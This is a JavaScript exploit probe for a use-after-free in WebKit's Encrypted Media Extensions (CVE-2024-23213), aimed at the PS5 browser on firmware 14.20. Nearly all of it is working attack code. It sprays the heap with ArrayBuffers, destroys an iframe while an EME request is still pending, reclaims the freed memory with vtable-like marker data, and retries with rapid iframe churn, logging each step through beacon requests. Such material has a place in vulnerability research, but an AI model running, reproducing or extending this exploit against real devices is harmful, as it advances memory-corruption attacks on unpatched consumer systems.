// p182 — CVE-2024-23213 EME UAF probe for PS5 14.20
// Encrypted Media Extensions use-after-free in NavigatorEME
// Fixed Jan 25 2024 (Safari 17.3). PS5 runs Safari 17.0 = VULNERABLE.
//
// Bug: requestMediaKeySystemAccess captures Document* as raw pointer
// in async callback. Destroying the document before callback fires
// creates a dangling pointer → UAF on document->postTask().
//
// Beacon prefix: V182-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V182-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Step 1: Check if EME is available
  var hasEME = (typeof navigator.requestMediaKeySystemAccess === 'function');
  syncB('EME-' + (hasEME ? 'YES' : 'NO'));

  if (!hasEME) {
    syncB('NO-EME-ABORT');
    return;
  }

  // Step 2: Check available key systems
  var keySystems = [
    'com.widevine.alpha',
    'org.w3.clearkey',
    'com.apple.fps',
    'com.apple.fps.1_0',
    'com.apple.fps.2_0',
    'com.apple.fps.3_0',
    'com.sony.drm',
    'com.microsoft.playready',
    'com.microsoft.playready.recommendation',
    'com.netflix.drm'
  ];

  var config = [{
    initDataTypes: ['cenc'],
    videoCapabilities: [{
      contentType: 'video/mp4; codecs="avc1.42E01E"'
    }],
    audioCapabilities: [{
      contentType: 'audio/mp4; codecs="mp4a.40.2"'
    }]
  }];

  var testedCount = 0;
  var foundSystems = [];

  function testKeySystem(index) {
    if (index >= keySystems.length) {
      syncB('KEYSYS-DONE-FOUND-' + foundSystems.length);
      if (foundSystems.length > 0) {
        syncB('KEYSYS-LIST-' + foundSystems.join(','));
        startUAFProbe(foundSystems[0]);
      } else {
        // Try with minimal config
        syncB('TRY-MINIMAL');
        startUAFProbe('org.w3.clearkey');
      }
      return;
    }

    var ks = keySystems[index];
    try {
      navigator.requestMediaKeySystemAccess(ks, config).then(function(access) {
        syncB('KS-OK-' + ks.substring(0, 20));
        foundSystems.push(ks);
        testKeySystem(index + 1);
      }).catch(function(e) {
        syncB('KS-NO-' + ks.substring(0, 20));
        testKeySystem(index + 1);
      });
    } catch(e) {
      syncB('KS-ERR-' + ks.substring(0, 20) + '-' + (e.message || '').substring(0, 20));
      testKeySystem(index + 1);
    }
  }

  // Step 3: The actual UAF trigger
  function startUAFProbe(keySystem) {
    syncB('UAF-START-' + keySystem.substring(0, 20));

    // Phase A: Heap spray — fill freed Document-sized holes with controlled data
    // Document objects are typically large (several KB), allocated via FastMalloc
    // We spray ArrayBuffers of the same size to reclaim the freed memory
    var SPRAY_SIZE = 4096;  // Start with 4KB, adjust based on Document size
    var SPRAY_COUNT = 256;
    var sprays = [];

    for (var i = 0; i < SPRAY_COUNT; i++) {
      var ab = new ArrayBuffer(SPRAY_SIZE);
      var view = new Float64Array(ab);
      // Fill with a recognizable pattern
      for (var j = 0; j < view.length; j++) {
        view[j] = 3.14159 + (i * 0.001) + (j * 0.000001);
      }
      sprays.push(ab);
    }
    syncB('SPRAY-DONE-' + SPRAY_COUNT);

    // Phase B: Create iframe and trigger requestMediaKeySystemAccess
    var iframe = document.createElement('iframe');
    iframe.srcdoc = '<html><body></body></html>';
    document.body.appendChild(iframe);

    iframe.onload = function() {
      var iframeNav = iframe.contentWindow.navigator;
      var iframeDoc = iframe.contentDocument;

      // Check if EME works in iframe
      if (typeof iframeNav.requestMediaKeySystemAccess !== 'function') {
        syncB('IFRAME-NO-EME');
        return;
      }

      syncB('IFRAME-EME-OK');

      // Fire the async request
      var requestFired = false;
      try {
        var promise = iframeNav.requestMediaKeySystemAccess(keySystem, config);

        promise.then(function(access) {
          syncB('CB-RESOLVED');
        }).catch(function(e) {
          syncB('CB-REJECTED-' + (e.message || e.name || '').substring(0, 30));
        });

        requestFired = true;
        syncB('REQ-FIRED');
      } catch(e) {
        syncB('REQ-THREW-' + (e.message || '').substring(0, 30));
      }

      if (!requestFired) {
        syncB('REQ-FAIL-ABORT');
        return;
      }

      // Phase C: DESTROY the iframe immediately
      // The Document is freed but the async callback still holds a raw pointer to it
      setTimeout(function() {
        syncB('DESTROY-IFRAME');

        // Remove iframe — this destroys the Document
        iframe.remove();
        iframe = null;

        // Force GC to actually free the Document memory
        // Allocate a lot of garbage to trigger collection
        for (var g = 0; g < 100000; g++) {
          var tmp = { a: g, b: [g, g+1, g+2] };
        }

        syncB('GC-FORCED');

        // Phase D: Spray again to reclaim Document memory
        var reclaimSprays = [];
        for (var i = 0; i < SPRAY_COUNT; i++) {
          var ab = new ArrayBuffer(SPRAY_SIZE);
          var view = new Uint32Array(ab);
          // Fill with vtable-like pattern: first 8 bytes = marker, rest = controlled
          view[0] = 0x41414141;
          view[1] = 0x42424242;
          // Fill rest with a recognizable pattern
          for (var j = 2; j < view.length; j++) {
            view[j] = 0xDEAD0000 + j;
          }
          reclaimSprays.push(ab);
        }
        syncB('RECLAIM-SPRAY-DONE');

        // The async callback should fire on the next event loop tick
        // If the UAF works, it will try to call document->postTask()
        // through our controlled data → crash or controlled behavior

        // Wait a bit to see what happens
        setTimeout(function() {
          syncB('POST-UAF-ALIVE');
          // If we get here, either:
          // 1. The callback fired but didn't crash (null deref caught?)
          // 2. The callback hasn't fired yet
          // 3. EME callback was synchronous (no UAF possible)
          // 4. The fix is present (WeakPtr + null check)

          // Phase E: Try with different timing
          // Maybe we need MORE delay before destroying, or LESS
          syncB('PHASE-E-TIMING');

          // Rapid fire: create and destroy many iframes with pending requests
          var rapidCount = 0;
          var RAPID_TOTAL = 10;

          function rapidFire() {
            if (rapidCount >= RAPID_TOTAL) {
              syncB('RAPID-DONE-' + rapidCount);
              setTimeout(function() {
                syncB('RAPID-POST-ALIVE');
                syncB('COMPLETE');
              }, 500);
              return;
            }

            var f = document.createElement('iframe');
            f.srcdoc = '<html><body></body></html>';
            document.body.appendChild(f);

            f.onload = function() {
              try {
                var nav = f.contentWindow.navigator;
                if (typeof nav.requestMediaKeySystemAccess === 'function') {
                  nav.requestMediaKeySystemAccess(keySystem, config).then(function() {}).catch(function() {});
                }
              } catch(e) {}

              // Destroy immediately — no setTimeout
              f.remove();
              f = null;

              rapidCount++;
              syncB('RAPID-' + rapidCount);

              // Small delay between rapid fires
              setTimeout(rapidFire, 10);
            };
          }

          rapidFire();
        }, 200);
      }, 0);  // setTimeout 0 — destroy on next event loop tick
    };
  }

  // Start the probe
  testKeySystem(0);
})();
